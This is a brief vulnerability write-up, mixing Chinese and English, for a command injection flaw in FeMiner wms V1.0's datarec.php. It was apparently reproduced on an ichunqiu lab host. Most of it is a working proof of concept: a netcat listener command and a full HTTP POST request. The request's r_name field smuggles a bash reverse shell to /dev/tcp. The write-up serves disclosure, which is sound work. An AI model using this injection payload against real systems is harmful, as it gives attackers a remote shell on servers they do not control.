## 1. 漏洞介绍

A remote command execution (RCE) vulnerability was found in FeMiner wms V1.0 in /wms/src/system/datarec.php. The $\_POST[r_name] is directly passed into the $mysqlstr and is executed by exec.  

[Remote Command Execution vulnerability in /wms/src/system/datarec.php · Issue #12 · FeMiner/wms · GitHub](https://github.com/FeMiner/wms/issues/12)

## 2. 漏洞复现

服务器开启监听

```bash
nc -lvp 65528
```

利用 burpsuite 抓包修改实现反弹 shell 

```http
POST /system/datarec.php HTTP/1.1
Host: eci-2…………k9j.cloudeci1.ichunqiu.com
Content-Length: 77
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://eci-2…………k9j.cloudeci1.ichunqiu.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://eci-2…………k9j.cloudeci1.ichunqiu.com
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8
Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1702777793; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1702777861; 
Connection: close

r_name=$(bash+-c+'bash+-i+>%26+/dev/tcp/ip/port+0<%261+2>%261')  
```

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312171031330.png)

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312171031030.png)
